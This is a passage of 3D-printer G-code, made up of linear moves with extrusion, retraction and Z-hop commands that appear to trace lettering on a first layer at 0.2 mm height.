G1 X106.302 Y100.504 E0.02340
G1 X106.329 Y100.780 E0.00869
G1 X106.405 Y101.156 E0.01202
G1 X106.566 Y101.463 E0.01087
G1 X106.718 Y101.649 E0.00753
G1 X106.990 Y101.846 E0.01052
G1 X107.363 Y102.003 E0.01271
G1 X107.751 Y102.065 E0.01232
G1 X108.831 Y102.086 E0.03386
G1 X108.831 Y101.655 E0.01351
G1 X109.109 Y101.827 E0.01024
G1 X109.341 Y101.914 E0.00778
G1 X109.573 Y101.980 E0.00756
G1 X110.019 Y102.023 E0.01404
G1 X110.559 Y101.955 E0.01708
G1 X110.943 Y101.805 E0.01292
G1 X111.396 Y101.470 E0.01764
G1 X111.594 Y101.217 E0.01010
G1 X111.750 Y100.949 E0.00972
G1 X111.835 Y100.649 E0.00976
G1 X111.880 Y100.308 E0.01079
G1 X111.858 Y100.202 E0.00339
G1 X111.902 Y100.278 E0.00274
G1 X112.339 Y100.631 E0.01763
G1 X112.558 Y100.747 E0.00776
G1 X112.913 Y100.847 E0.01156
G1 X113.312 Y100.894 E0.01261
G1 X113.610 Y100.841 E0.00948
G1 X113.610 Y102.002 E0.03639
G1 X115.607 Y102.002 E0.06263
G1 X115.607 Y97.053 E0.15515
G1 X118.558 Y97.053 E0.09252
G1 X118.558 Y100.818 E0.11804
G1 X120.389 Y100.818 E0.05743
G1 X120.441 Y100.839 E0.00175
G1 X120.886 Y100.893 E0.01404
G1 X121.270 Y100.842 E0.01217
G1 X121.639 Y100.730 E0.01207
G1 X121.962 Y100.522 E0.01205
G1 X122.211 Y100.298 E0.01050
G1 X122.211 Y100.818 E0.01630
G1 X123.857 Y100.818 E0.05161
G1 X123.927 Y100.848 E0.00237
G1 X124.261 Y100.892 E0.01056
G1 X124.499 Y100.870 E0.00749
G1 X124.792 Y100.797 E0.00946
G1 X125.287 Y101.026 E0.01711
G1 X125.536 Y101.197 E0.00948
G1 X125.748 Y101.408 E0.00935
G1 X126.084 Y102.019 E0.02188
G1 X127.686 Y102.019 E0.05024
G1 X127.686 Y96.532 E0.17203
G1 X125.689 Y96.532 E0.06263
G1 X125.689 Y99.168 E0.08264
G1 X124.976 Y98.849 E0.02447
G1 X124.887 Y98.597 E0.00838
G1 X124.668 Y98.711 E0.00774
G1 X124.625 Y98.692 E0.00145
G1 X124.625 Y98.733 E0.00128
G1 X124.256 Y98.924 E0.01306
G1 X124.216 Y98.577 E0.01096
G1 X124.206 Y96.532 E0.06410
G1 X122.211 Y96.532 E0.06253
G1 X122.211 Y97.059 E0.01652
G1 X121.817 Y96.725 E0.01620
G1 X121.446 Y96.551 E0.01287
G1 X120.953 Y96.464 E0.01568
G1 X120.555 Y96.491 E0.01251
G1 X120.555 Y96.432 E0.00184
G1 X140.097 Y96.432 E0.61272
G1 X140.097 Y96.472 E0.00127
G1 X140.569 Y96.910 F10800.000
G1 F1200
G1 X140.569 Y101.624 E0.14783
G1 X139.326 Y101.624 E0.03898
G1 X139.326 Y100.316 E0.04104
G1 X139.082 Y100.434 E0.00849
G1 X138.640 Y100.513 E0.01409
G1 X138.325 Y100.476 E0.00992
G1 X138.038 Y100.395 E0.00936
G1 X137.887 Y100.315 E0.00537
G1 X137.531 Y100.027 E0.01434
G1 X137.255 Y99.557 E0.01711
G1 X137.152 Y99.211 E0.01132
G1 X137.110 Y98.686 E0.01650
G1 X137.156 Y98.160 E0.01656
G1 X137.262 Y97.813 E0.01136
G1 X137.537 Y97.346 E0.01700
G1 X137.770 Y97.135 E0.00987
G1 X138.018 Y96.973 E0.00927
G1 X138.176 Y96.913 E0.00531
G1 X138.567 Y96.843 E0.01246
G1 X138.937 Y96.876 E0.01164
G1 X139.241 Y96.991 E0.01018
G1 X139.384 Y97.089 E0.00545
G1 X139.384 Y96.910 E0.00562
G1 X140.509 Y96.910 E0.03526
G1 X140.968 Y96.890 F10800.000
G1 F8640
G1 X140.551 Y100.201 E-0.76000
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X133.245 Y101.695
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X131.998 Y100.970 E0.04520
G1 X131.998 Y100.441 E0.01659
G1 X131.621 Y100.441 E0.01185
G1 X131.621 Y99.365 E0.03375
G1 X131.999 Y99.365 E0.01186
G1 X132.002 Y97.915 E0.04546
G1 X132.027 Y97.605 E0.00974
G1 X132.075 Y97.400 E0.00663
G1 X132.176 Y97.191 E0.00727
G1 X132.347 Y97.025 E0.00746
G1 X132.650 Y96.888 E0.01041
G1 X132.935 Y96.841 E0.00907
G1 X133.383 Y96.869 E0.01406
G1 X133.892 Y97.021 E0.01667
G1 X133.775 Y98.086 E0.03360
G1 X133.387 Y97.964 E0.01277
G1 X133.259 Y97.950 E0.00404
G1 X133.246 Y99.365 E0.04437
G1 X133.807 Y99.365 E0.01758
G1 X133.807 Y100.134 E0.02412
G1 X134.943 Y99.941 E0.03612
G1 X135.034 Y100.328 E0.01247
G1 X135.118 Y100.458 E0.00485
G1 X135.211 Y100.520 E0.00351
G1 X135.333 Y100.543 E0.00388
G1 X135.485 Y100.501 E0.00496
G1 X135.567 Y100.392 E0.00427
G1 X135.585 Y100.279 E0.00359
G1 X135.569 Y100.165 E0.00361
G1 X135.486 Y100.038 E0.00476
G1 X135.324 Y99.957 E0.00570
G1 X134.926 Y99.921 E0.01251
G1 X134.774 Y98.797 E0.03557
G1 X135.318 Y98.900 E0.01737
G1 X135.473 Y98.894 E0.00486
G1 X135.566 Y98.860 E0.00312
G1 X135.643 Y98.798 E0.00310
G1 X135.734 Y98.638 E0.00576
G1 X135.761 Y98.444 E0.00615
G1 X135.732 Y98.234 E0.00665
G1 X135.634 Y98.059 E0.00628
G1 X135.489 Y97.961 E0.00550
G1 X135.364 Y97.941 E0.00395
G1 X135.198 Y97.982 E0.00537
G1 X135.119 Y98.038 E0.00306
G1 X135.018 Y98.190 E0.00572
G1 X134.919 Y98.587 E0.01281
G1 X133.710 Y98.440 E0.03820
G1 X133.814 Y97.952 E0.01565
G1 X133.913 Y97.681 E0.00903
G1 X134.072 Y97.442 E0.00901
G1 X134.270 Y97.220 E0.00932
G1 X134.525 Y97.051 E0.00961
G1 X134.795 Y96.922 E0.00936
G1 X135.172 Y96.853 E0.01202
G1 X135.377 Y96.835 E0.00646
G1 X135.696 Y96.868 E0.01006
G1 X136.006 Y96.945 E0.01002
G1 X136.287 Y97.096 E0.01000
G1 X136.550 Y97.292 E0.01028
G1 X136.750 Y97.534 E0.00986
G1 X136.907 Y97.799 E0.00967
G1 X136.991 Y98.096 E0.00966
G1 X137.029 Y98.412 E0.00996
G1 X136.966 Y98.829 E0.01323
G1 X136.761 Y99.207 E0.01349
G1 X136.441 Y99.486 E0.01330
G1 X136.617 Y99.665 E0.00786
G1 X136.703 Y99.813 E0.00535
G1 X136.770 Y100.004 E0.00638
G1 X136.836 Y100.322 E0.01018
G1 X136.804 Y100.573 E0.00792
G1 X136.739 Y100.800 E0.00741
G1 X136.620 Y101.005 E0.00742
G1 X136.469 Y101.197 E0.00767
G1 X136.098 Y101.472 E0.01447
G1 X135.805 Y101.586 E0.00988
G1 X135.352 Y101.643 E0.01430
G1 X134.982 Y101.607 E0.01167
G1 X134.615 Y101.487 E0.01212
G1 X134.325 Y101.308 E0.01066
G1 X134.091 Y101.055 E0.01082
G1 X133.915 Y100.704 E0.01229
G1 X133.807 Y100.310 E0.01282
G1 X133.807 Y100.441 E0.00411
G1 X133.245 Y100.441 E0.01764
G1 X133.245 Y101.635 E0.03743
G1 X133.056 Y102.047 F10800.000
G1 F8640
G1 X131.998 Y100.970 E-0.32612
G1 X131.998 Y100.441 E-0.12214
G1 X131.621 Y100.441 E-0.08726
G1 X131.621 Y99.469 E-0.22447
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X135.325 Y98.518
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X135.366 Y98.352 E0.00534
G1 X135.372 Y98.504 E0.00477
G1 F8640
G1 X135.366 Y98.352 E-0.03515
G1 X135.372 Y98.504 E-0.03515
G1 E-0.72970 F2100.00000
G1 Z0.800 F10800.000
G1 X134.408 Y98.905
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X134.507 Y99.633 E0.02304
G1 X134.184 Y99.687 E0.01025
G1 X134.184 Y98.988 E0.02194
G1 X133.627 Y98.988 E0.01748
G1 X133.628 Y98.810 E0.00557
G1 X134.348 Y98.897 E0.02274
G1 F8640
G1 X134.507 Y99.633 E-0.17368
G1 X134.184 Y99.687 E-0.07550
G1 X134.184 Y98.988 E-0.16160
G1 X133.627 Y98.988 E-0.12871
G1 X133.628 Y98.810 E-0.04101
G1 X134.348 Y98.897 E-0.16750
G1 E-0.05200 F2100.00000
G1 Z0.800 F10800.000
G1 X128.289 Y96.910
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X129.533 Y96.910 E0.03898
G1 X129.533 Y98.706 E0.05634
G1 X129.587 Y99.177 E0.01486
G1 X129.645 Y99.290 E0.00399
G1 X129.739 Y99.379 E0.00406
G1 X129.863 Y99.439 E0.00432
G1 X130.004 Y99.459 E0.00446
G1 X130.092 Y99.448 E0.00278
G1 X130.166 Y99.414 E0.00256
G1 X130.255 Y99.296 E0.00464
G1 X130.303 Y98.862 E0.01367
G1 X130.302 Y96.910 E0.06123
G1 X131.545 Y96.910 E0.03898
G1 X131.545 Y99.059 E0.06740
G1 X131.520 Y99.492 E0.01360
G1 X131.493 Y99.658 E0.00527
G1 X131.418 Y99.878 E0.00728
G1 X131.293 Y100.085 E0.00760
G1 X131.100 Y100.270 E0.00838
G1 X130.870 Y100.396 E0.00820
G1 X130.585 Y100.485 E0.00935
G1 X130.284 Y100.513 E0.00950
G1 X129.939 Y100.461 E0.01094
G1 X129.622 Y100.355 E0.01047
G1 X129.474 Y100.261 E0.00548
G1 X129.474 Y100.441 E0.00563
G1 X128.289 Y100.441 E0.03714
G1 X128.289 Y96.970 E0.10884
G1 X128.246 Y96.512 F10800.000
G1 X127.309 Y96.970
G1 F1200
G1 X127.309 Y101.642 E0.14650
G1 X126.307 Y101.642 E0.03142
G1 X126.052 Y101.179 E0.01658
G1 X125.778 Y100.906 E0.01212
G1 X125.474 Y100.697 E0.01156
G1 X125.002 Y100.479 E0.01629
G1 X125.002 Y100.292 E0.00587
G1 X124.617 Y100.462 E0.01321
G1 X124.268 Y100.512 E0.01105
G1 X124.029 Y100.481 E0.00756
G1 X123.773 Y100.357 E0.00893
G1 X123.773 Y100.441 E0.00264
G1 X122.588 Y100.441 E0.03714
G1 X122.588 Y96.910 E0.11072
G1 X123.831 Y96.910 E0.03895
G1 X123.839 Y98.599 E0.05298
G1 X123.889 Y99.041 E0.01393
G1 X123.917 Y99.146 E0.00343
G1 X124.011 Y99.296 E0.00555
G1 X124.113 Y99.345 E0.00354
G1 X124.170 Y99.351 E0.00179
G1 X124.299 Y99.326 E0.00414
G1 X124.676 Y99.131 E0.01331
G1 X125.002 Y100.049 E0.03055
G1 X125.002 Y99.274 E0.02430
G1 X125.881 Y99.668 E0.03020
G1 X126.066 Y99.793 E0.00700
G1 X126.066 Y96.910 E0.09042
G1 X127.309 Y96.910 E0.03898
G1 X127.680 Y96.819 F10800.000
G1 F8640
G1 X127.309 Y100.201 E-0.76000
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X114.758 Y96.532
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X113.755 Y96.532 E0.03145
G1 X113.683 Y96.505 E0.00241
G1 X113.212 Y96.463 E0.01483
G1 X112.736 Y96.548 E0.01516
G1 X112.507 Y96.635 E0.00769
G1 X112.201 Y96.835 E0.01146
G1 X111.902 Y97.105 E0.01261
G1 X111.749 Y97.366 E0.00949
G1 X111.473 Y97.017 E0.01394
G1 X111.152 Y96.777 E0.01258
G1 X110.804 Y96.590 E0.01237
G1 X110.422 Y96.495 E0.01234
G1 X110.041 Y96.457 E0.01200
G1 X109.783 Y96.479 E0.00813
G1 X109.339 Y96.560 E0.01417
G1 X109.000 Y96.722 E0.01176
G1 X108.831 Y96.834 E0.00638
G1 X108.831 Y96.432 E0.01262
G1 X114.758 Y96.432 E0.18585
G1 X114.758 Y96.472 E0.00127
G1 X115.230 Y96.910 F10800.000
G1 F1200
G1 X115.230 Y101.624 E0.14783
G1 X113.987 Y101.624 E0.03898
G1 X113.987 Y100.316 E0.04104
G1 X113.743 Y100.434 E0.00849
G1 X113.301 Y100.513 E0.01409
G1 X112.987 Y100.476 E0.00992
G1 X112.699 Y100.395 E0.00936
G1 X112.548 Y100.315 E0.00537
G1 X112.192 Y100.027 E0.01434
G1 X111.916 Y99.557 E0.01711
G1 X111.814 Y99.211 E0.01132
G1 X111.771 Y98.686 E0.01650
G1 X111.818 Y98.160 E0.01656
G1 X111.923 Y97.813 E0.01136
G1 X112.198 Y97.346 E0.01700
G1 X112.432 Y97.135 E0.00987
G1 X112.679 Y96.973 E0.00927
G1 X112.837 Y96.913 E0.00531
G1 X113.228 Y96.843 E0.01246
G1 X113.598 Y96.876 E0.01164
G1 X113.902 Y96.991 E0.01018
G1 X114.045 Y97.089 E0.00545
G1 X114.045 Y96.910 E0.00562
G1 X115.170 Y96.910 E0.03526
G1 X115.629 Y96.890 F10800.000
G1 F8640
G1 X115.212 Y100.201 E-0.76000
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X108.422 Y100.142
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X109.604 Y99.941 E0.03759
G1 X109.695 Y100.328 E0.01247
G1 X109.779 Y100.458 E0.00485
G1 X109.872 Y100.520 E0.00351
G1 X109.994 Y100.543 E0.00388
G1 X110.072 Y100.534 E0.00245
G1 X110.173 Y100.481 E0.00356
G1 X110.229 Y100.392 E0.00330
G1 X110.246 Y100.279 E0.00359
G1 X110.230 Y100.165 E0.00361
G1 X110.148 Y100.038 E0.00476
G1 X109.985 Y99.957 E0.00570
G1 X109.587 Y99.921 E0.01251
G1 X109.435 Y98.797 E0.03557
G1 X109.979 Y98.900 E0.01737
G1 X110.134 Y98.894 E0.00486
G1 X110.227 Y98.860 E0.00312
G1 X110.304 Y98.798 E0.00311
G1 X110.395 Y98.638 E0.00576
G1 X110.422 Y98.444 E0.00615
G1 X110.393 Y98.234 E0.00665
G1 X110.295 Y98.059 E0.00628
G1 X110.150 Y97.961 E0.00550
G1 X110.026 Y97.941 E0.00395
G1 X109.859 Y97.982 E0.00537
G1 X109.780 Y98.038 E0.00306
G1 X109.679 Y98.190 E0.00572
G1 X109.580 Y98.587 E0.01281
G1 X108.371 Y98.440 E0.03820
G1 X108.476 Y97.952 E0.01565
G1 X108.574 Y97.681 E0.00903
G1 X108.733 Y97.442 E0.00901
G1 X108.931 Y97.220 E0.00932
G1 X109.187 Y97.051 E0.00961
G1 X109.456 Y96.922 E0.00936
G1 X109.833 Y96.853 E0.01202
G1 X110.038 Y96.835 E0.00646
G1 X110.357 Y96.868 E0.01006
G1 X110.668 Y96.945 E0.01002
G1 X110.948 Y97.096 E0.01000
G1 X111.211 Y97.292 E0.01028
G1 X111.411 Y97.534 E0.00986
G1 X111.569 Y97.799 E0.00967
G1 X111.652 Y98.096 E0.00966
G1 X111.690 Y98.412 E0.00996
G1 X111.627 Y98.829 E0.01323
G1 X111.422 Y99.207 E0.01349
G1 X111.103 Y99.486 E0.01330
G1 X111.278 Y99.665 E0.00786
G1 X111.364 Y99.813 E0.00535
G1 X111.432 Y100.004 E0.00638
G1 X111.497 Y100.322 E0.01018
G1 X111.465 Y100.573 E0.00792
G1 X111.400 Y100.800 E0.00741
G1 X111.282 Y101.005 E0.00742
G1 X111.131 Y101.197 E0.00767
G1 X110.759 Y101.472 E0.01447
G1 X110.466 Y101.586 E0.00988
G1 X110.013 Y101.643 E0.01430
G1 X109.643 Y101.607 E0.01167
G1 X109.459 Y101.556 E0.00600
G1 X109.276 Y101.487 E0.00613
G1 X108.986 Y101.308 E0.01066
G1 X108.752 Y101.055 E0.01082
G1 X108.576 Y100.704 E0.01229
G1 X108.438 Y100.200 E0.01641
G1 X108.332 Y99.752 F10800.000
G1 F8640
G1 X109.604 Y99.941 E-0.27578
G1 X109.695 Y100.328 E-0.09183
G1 X109.779 Y100.458 E-0.03575
G1 X109.872 Y100.520 E-0.02587
G1 X109.994 Y100.543 E-0.02858
G1 X110.072 Y100.534 E-0.01808
G1 X110.173 Y100.481 E-0.02624
G1 X110.229 Y100.392 E-0.02431
G1 X110.246 Y100.279 E-0.02647
G1 X110.230 Y100.165 E-0.02655
G1 X110.148 Y100.038 E-0.03503
G1 X109.985 Y99.957 E-0.04200
G1 X109.587 Y99.921 E-0.09214
G1 X109.581 Y99.872 E-0.01136
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X108.204 Y97.595
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X108.223 Y97.148 E0.01403
G1 X108.495 Y97.142 E0.00855
G1 X108.224 Y97.538 E0.01506
G1 F8640
G1 X108.223 Y97.148 E-0.09021
G1 X108.495 Y97.142 E-0.06298
G1 X108.224 Y97.538 E-0.11093
G1 E-0.53587 F2100.00000
G1 Z0.800 F10800.000
G1 X107.940 Y98.650
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X107.938 Y98.659 E0.00029
G1 X107.995 Y98.774 F10800.000
G1 F1200
G1 X109.069 Y98.905 E0.03394
G1 X109.168 Y99.633 E0.02304
G1 X108.206 Y99.796 E0.03058
G1 X108.191 Y99.451 E0.01082
G1 X108.107 Y99.037 E0.01327
G1 X108.019 Y98.829 E0.00707
G1 F8640
G1 X109.069 Y98.905 E-0.24315
G1 X109.168 Y99.633 E-0.16966
G1 X108.206 Y99.796 E-0.22518
G1 X108.191 Y99.451 E-0.07966
G1 X108.155 Y99.272 E-0.04236
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X109.986 Y98.518
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X110.027 Y98.352 E0.00534
G1 X110.033 Y98.504 E0.00477
G1 F8640
G1 X110.027 Y98.352 E-0.03515
G1 X110.033 Y98.504 E-0.03515
G1 E-0.72970 F2100.00000
G1 Z0.800 F10800.000
G1 X106.332 Y96.532
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X104.694 Y96.532 E0.05135
G1 X104.319 Y97.508 E0.03277
G1 X103.417 Y97.508 E0.02829
G1 X103.062 Y96.532 E0.03255
G1 X100.872 Y96.532 E0.06866
G1 X100.930 Y96.681 E0.00500
G1 X100.867 Y96.648 E0.00222
G1 X100.291 Y96.494 E0.01870
G1 X99.722 Y96.455 E0.01788
G1 X99.122 Y96.503 E0.01887
G1 X98.877 Y96.558 E0.00788
G1 X98.491 Y96.719 E0.01312
G1 X98.083 Y96.965 E0.01493
G1 X97.836 Y97.254 E0.01193
G1 X97.836 Y96.532 E0.02263
G1 X96.051 Y96.532 E0.05595
G1 X95.234 Y97.854 E0.04872
G1 X95.234 Y96.532 E0.04144
G1 X92.720 Y96.532 E0.07882
G1 X92.720 Y96.432 E0.00315
G1 X106.347 Y96.432 E0.42725
G1 X106.340 Y96.473 E0.00131
G1 X106.340 Y96.910 F10800.000
G1 F1200
G1 X104.463 Y101.624 E0.15912
G1 X103.260 Y101.624 E0.03771
G1 X101.424 Y96.910 E0.15865
G1 X102.798 Y96.910 E0.04309
G1 X103.152 Y97.885 E0.03255
G1 X104.578 Y97.885 E0.04469
G1 X104.953 Y96.910 E0.03277
G1 X106.280 Y96.910 E0.04163
G1 X106.739 Y96.943 F10800.000
G1 F8640
G1 X105.097 Y99.981 E-0.76000
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X100.292 Y99.932
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X101.555 Y99.987 E0.03962
G1 X101.483 Y100.501 E0.01625
G1 X101.395 Y100.795 E0.00963
G1 X101.233 Y101.055 E0.00961
G1 X101.018 Y101.299 E0.01020
G1 X100.541 Y101.563 E0.01709
G1 X100.193 Y101.660 E0.01134
G1 X99.672 Y101.698 E0.01637
G1 X99.196 Y101.662 E0.01495
G1 X98.738 Y101.533 E0.01492
G1 X98.386 Y101.325 E0.01282
G1 X98.109 Y101.020 E0.01293
G1 X97.947 Y100.676 E0.01191
G1 X97.908 Y100.483 E0.00618
G1 X97.890 Y100.285 E0.00622
G1 X97.927 Y100.000 E0.00903
G1 X97.992 Y99.773 E0.00739
G1 X98.084 Y99.593 E0.00634
G1 X98.357 Y99.264 E0.01341
G1 X98.741 Y99.028 E0.01415
G1 X99.014 Y98.913 E0.00926
G1 X100.180 Y98.582 E0.03803
G1 X100.318 Y98.486 E0.00526
G1 X100.358 Y98.372 E0.00380
G1 X100.335 Y98.260 E0.00359
G1 X100.230 Y98.124 E0.00538
G1 X100.002 Y98.015 E0.00793
G1 X99.730 Y97.987 E0.00857
G1 X99.457 Y98.022 E0.00861
G1 X99.238 Y98.138 E0.00777
G1 X99.081 Y98.353 E0.00835
G1 X98.942 Y98.825 E0.01542
G1 X97.696 Y98.704 E0.03924
G1 X97.802 Y98.154 E0.01755
G1 X97.911 Y97.826 E0.01084
G1 X98.092 Y97.534 E0.01078
G1 X98.330 Y97.256 E0.01146
G1 X98.661 Y97.056 E0.01214
G1 X98.992 Y96.918 E0.01122
G1 X99.182 Y96.876 E0.00613
G1 X99.720 Y96.833 E0.01690
G1 X100.229 Y96.868 E0.01601
G1 X100.730 Y97.002 E0.01625
G1 X100.936 Y97.110 E0.00730
G1 X101.196 Y97.304 E0.01018
G1 X101.410 Y97.564 E0.01055
G1 X101.554 Y97.852 E0.01009
G1 X101.629 Y98.152 E0.00971
G1 X101.649 Y98.367 E0.00677
G1 X101.636 Y98.577 E0.00660
G1 X101.576 Y98.874 E0.00948
G1 X101.445 Y99.165 E0.01001
G1 X101.202 Y99.460 E0.01200
G1 X100.893 Y99.674 E0.01178
G1 X100.398 Y99.872 E0.01670
G1 X99.419 Y100.142 E0.03184
G1 X99.199 Y100.252 E0.00772
G1 X99.149 Y100.321 E0.00268
G1 X99.152 Y100.397 E0.00236
G1 X99.189 Y100.439 E0.00175
G1 X99.404 Y100.533 E0.00737
G1 X99.660 Y100.559 E0.00807
G1 X99.893 Y100.537 E0.00732
G1 X100.073 Y100.454 E0.00621
G1 X100.181 Y100.314 E0.00556
G1 X100.275 Y99.989 E0.01059
G1 X100.357 Y99.537 F10800.000
G1 F8640
G1 X101.555 Y99.987 E-0.29540
G1 X101.483 Y100.501 E-0.11970
G1 X101.395 Y100.795 E-0.07091
G1 X101.233 Y101.055 E-0.07077
G1 X101.018 Y101.299 E-0.07515
G1 X100.541 Y101.563 E-0.12587
G1 X100.532 Y101.566 E-0.00220
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X97.994 Y99.112
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X97.836 Y99.302 E0.00776
G1 X97.836 Y99.096 E0.00644
G1 X97.934 Y99.106 E0.00310
G1 F8640
G1 X97.836 Y99.302 E-0.05064
G1 X97.836 Y99.096 E-0.04746
G1 X97.934 Y99.106 E-0.02286
G1 E-0.67904 F2100.00000
G1 Z0.800 F10800.000
G1 X93.631 Y96.910
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X94.857 Y96.910 E0.03843
G1 X94.857 Y99.181 E0.07123
G1 X96.261 Y96.910 E0.08374
G1 X97.459 Y96.910 E0.03754
G1 X97.459 Y101.624 E0.14783
G1 X96.233 Y101.624 E0.03843
G1 X96.233 Y99.291 E0.07317
G1 X94.803 Y101.624 E0.08582
G1 X93.631 Y101.624 E0.03673
G1 X93.631 Y96.970 E0.14595
G1 X93.599 Y96.511 F10800.000
G1 F8640
G1 X94.857 Y96.910 E-0.28335
G1 X94.857 Y98.974 E-0.47665
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X147.643 Y97.774
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X149.401 Y97.774 E0.05511
G1 X149.401 Y96.910 E0.02710
G1 X150.618 Y96.910 E0.03815
G1 X150.618 Y97.774 E0.02710
G1 X151.151 Y97.774 E0.01672
G1 X151.151 Y98.046 E0.00854
G1 X151.201 Y97.828 E0.00703
G1 X151.290 Y97.581 E0.00821
G1 X151.430 Y97.361 E0.00817
G1 X151.610 Y97.150 E0.00871
G1 X151.836 Y97.006 E0.00841
G1 X152.069 Y96.900 E0.00802
G1 X152.569 Y96.832 E0.01581
G1 X152.932 Y96.876 E0.01148
G1 X153.282 Y96.979 E0.01141
G1 X153.587 Y97.176 E0.01140
G1 X153.869 Y97.434 E0.01198
G1 X154.103 Y97.871 E0.01555
G1 X154.196 Y98.090 E0.00744
G1 X154.266 Y98.324 E0.00767
G1 X154.332 Y98.792 E0.01481
G1 X154.347 Y99.264 E0.01481
G1 X154.334 Y99.725 E0.01447
G1 X154.270 Y100.188 E0.01465
G1 X154.116 Y100.621 E0.01440
G1 X153.888 Y101.054 E0.01536
G1 X153.622 Y101.304 E0.01142
G1 X153.332 Y101.497 E0.01092
G1 X152.999 Y101.598 E0.01091
G1 X152.649 Y101.643 E0.01110
G1 X152.332 Y101.610 E0.00999
G1 X152.029 Y101.532 E0.00981
G1 X151.757 Y101.378 E0.00979
G1 X151.503 Y101.177 E0.01016
G1 X151.305 Y100.904 E0.01056
G1 X151.158 Y100.617 E0.01011
G1 X151.086 Y100.302 E0.01015
G1 X151.058 Y99.976 E0.01025
G1 X151.109 Y99.523 E0.01431
G1 X151.156 Y99.356 E0.00542
G1 X151.293 Y99.082 E0.00961
G1 X151.479 Y98.817 E0.01016
G1 X151.702 Y98.627 E0.00918
G1 X151.945 Y98.477 E0.00897
G1 X152.161 Y98.413 E0.00704
G1 X151.151 Y98.302 E0.03186
G1 X151.151 Y98.917 E0.01930
G1 X150.618 Y98.917 E0.01672
G1 X150.618 Y101.642 E0.08543
G1 X149.605 Y101.642 E0.03174
G1 X147.643 Y98.769 E0.10908
G1 X147.643 Y97.834 E0.02933
G1 X147.581 Y97.379 F10800.000
G1 X147.916 Y97.397
G1 F1200
G1 X147.916 Y96.532 E0.02710
G1 X144.693 Y96.532 E0.10104
G1 X144.693 Y96.432 E0.00315
G1 X153.960 Y96.432 E0.29057
G1 X153.960 Y97.006 E0.01802
G1 X153.819 Y96.877 E0.00603
G1 X153.440 Y96.632 E0.01412
G1 X153.009 Y96.506 E0.01411
G1 X152.578 Y96.454 E0.01360
G1 X152.346 Y96.471 E0.00728
G1 X151.958 Y96.536 E0.01234
G1 X151.656 Y96.673 E0.01040
G1 X151.360 Y96.862 E0.01102
G1 X151.126 Y97.137 E0.01131
G1 X150.995 Y97.343 E0.00766
G1 X150.995 Y96.532 E0.02542
G1 X149.024 Y96.532 E0.06180
G1 X149.024 Y97.397 E0.02710
G1 X147.976 Y97.397 E0.03286
G1 F8640
G1 X147.916 Y96.532 E-0.20004
G1 X145.491 Y96.532 E-0.55996
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X154.103 Y97.137
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X154.566 Y97.148 E0.01453
G1 X154.600 Y97.888 E0.02324
G1 X154.688 Y98.314 E0.01364
G1 X154.804 Y98.582 E0.00917
G1 X154.863 Y98.669 E0.00328
G1 X154.715 Y98.955 E0.01008
G1 X154.709 Y98.759 E0.00612
G1 X154.636 Y98.243 E0.01635
G1 X154.551 Y97.962 E0.00921
G1 X154.444 Y97.708 E0.00863
G1 X154.147 Y97.178 E0.01905
G1 F8640
G1 X154.566 Y97.148 E-0.09700
G1 X154.600 Y97.888 E-0.17112
G1 X154.688 Y98.314 E-0.10048
G1 X154.804 Y98.582 E-0.06750
G1 X154.863 Y98.669 E-0.02412
G1 X154.715 Y98.955 E-0.07424
G1 X154.709 Y98.759 E-0.04509
G1 X154.636 Y98.243 E-0.12044
G1 X154.561 Y97.994 E-0.06001
G1 E-0.04000 F2100.00000
G1 Z0.800 F10800.000
G1 X138.949 Y102.002
G1 Z0.200
G1 E0.80000 F2100.00000
G1 F1200
G1 X140.946 Y102.002 E0.06263
G1 X140.946 Y97.053 E0.15515
G1 X144.017 Y97.053 E0.09629
G1 X144.017 Y98.996 E0.06092
G1 X143.560 Y98.996 E0.01433
G1 X143.560 Y100.818 E0.05712
G1 X144.032 Y100.818 E0.01481
G1 X144.140 Y101.295 E0.01533
G1 X144.388 Y101.651 E0.01359
G1 X144.719 Y101.890 E0.01281
G1 X145.144 Y102.040 E0.01414
G1 X145.558 Y102.077 E0.01304
G1 X145.999 Y102.043 E0.01388
G1 X146.179 Y102.002 E0.00578
G1 X147.916 Y102.002 E0.05445
G1 X147.916 Y99.837 E0.06787
G1 X149.406 Y102.019 E0.08286
G1 X150.995 Y102.019 E0.04980
G1 X150.995 Y101.119 E0.02823
G1 X151.228 Y101.441 E0.01246
G1 X151.546 Y101.692 E0.01271
G1 X151.886 Y101.885 E0.01227
G1 X152.265 Y101.982 E0.01225
G1 X152.653 Y102.023 E0.01225
G1 X153.079 Y101.968 E0.01347
G1 X153.495 Y101.841 E0.01364
G1 X153.857 Y101.600 E0.01364
G1 X153.960 Y101.503 E0.00442
G1 X153.960 Y102.089 E0.01835
G1 X155.066 Y102.063 E0.03468
G1 X155.476 Y101.993 E0.01304
G1 X155.803 Y101.853 E0.01117
G1 X156.091 Y101.626 E0.01150
G1 X156.309 Y101.326 E0.01162
G1 X156.430 Y100.993 E0.01112
G1 X156.488 Y100.562 E0.01362
G1 X156.501 Y99.857 E0.02210
G1 X156.528 Y99.619 E0.00751
